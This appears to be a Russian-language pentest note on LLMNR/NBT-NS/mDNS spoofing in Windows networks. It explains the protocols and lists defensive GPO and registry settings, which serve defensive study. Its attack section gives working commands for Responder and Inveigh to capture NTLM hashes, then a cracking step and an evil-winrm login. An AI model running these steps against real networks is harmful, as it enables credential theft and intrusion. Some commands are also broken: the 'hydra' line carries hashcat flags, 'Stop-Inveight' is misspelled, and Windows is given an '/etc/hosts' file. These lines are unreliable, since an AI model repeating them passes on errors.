#attacks #network #protocol #llmnr #dns #nbns #spoofing
### Приоритет разрешения доменных имен в Windows

1) Local name
2) file `/etc/hosts`
3) DNS сервер
	DNS Запрос
	4) LLMNR         ->   
	5) NBT-NS       ->    Используются только с однокомпонентными  именами
	6) mDNS          -> 


### NBT-NS  (137 PORT)

> Устаревший протокол, использующийся для трансляции имен в IP адреса в Windows сетях

### LLMNR (5355 PORT)

> Выполняет разрешение доменных имен в локальных сетях, использует формат DNS

- Поддерживает IPv4 и IPv6
- Поддерживает более длинные имена

### Multicast DNS (5353 PORT)

> Преобразует имена хостов в IP адреса, где нет локального сервера имен

## Оглавление
  - [[#Приоритет разрешения доменных имен в Windows]]
  - [[#NBT-NS  (137 PORT)]]
  - [[#LLMNR (5355 PORT)]]
  - [[#Multicast DNS (5353 PORT)]]
- [[#Проведение атаки]]
- [[#Защита от атаки LLMNR/NBT-NS/mDNS Spoofing]]

---

## Проведение атаки

 > Пользователь ошибочно вводит неправильное имя по SMB, из-за чего идет разрешение имени через LLMNR/NBT-NS/mDNS.
 > Он посылает запрос за тем, чтобы узнать, кто это
 > Мы говорим, что это мы, запрашиваем аутентификацию и получаем креды 

1) Находясь в одной локальной сети с Windows машиной запускаем Responder для отравления протоколов LLMNR/NBNS/mDNS

Responder (linux)
```bash
sudo responder -I eth0 -A -vv
```

Inveigh (Windows)
```powershell
Import-Module .\Inveigh.ps1

Invoke-Inveigh Y -LLMNR Y -MDNS Y -NBNS Y <...> -ConsoleOutput Y -FileOutput Y

Stop-Inveight
```

2) Перехватываем NTLM хэши учетных данных `/usr/share/responder/logs`
3) Брутим хэш любым инструментов

```bash
hydra -a 0 -w 4 -m 5600 {hash.txt} {dict.txt}
```

4) Подключаемся к машине с использованием протокола WINRM

```bash
evil-winrm -i 192.168.0.100 -u {username} -p {password}
```

## Защита от атаки LLMNR/NBT-NS/mDNS Spoofing
> **Отключение протоколов LLMNR/NBT-NS/mDNS во всей сети**

##### На всем домене через GPO:
- Создать или отредактировать GPO → Target: компьютеры
- Включить:
    - **Turn off Multicast Name Resolution**
    - Отключить NetBIOS в настройках сетевых профилей

##### Отключение через Реестр
LLMNR:
```powershell
reg add "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f
```
	
NBT-NS:
```powershell
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters /v NodeType /t REG_DWORD /d 0x8 /f
```
mDNS:
```powershell
sc stop "Bonjour Service"

reg add "HKLM\SYSTEM\CurrentControlSet\Services\Bonjour Service" /v Start /t REG_DWORD /d 4 /f
```

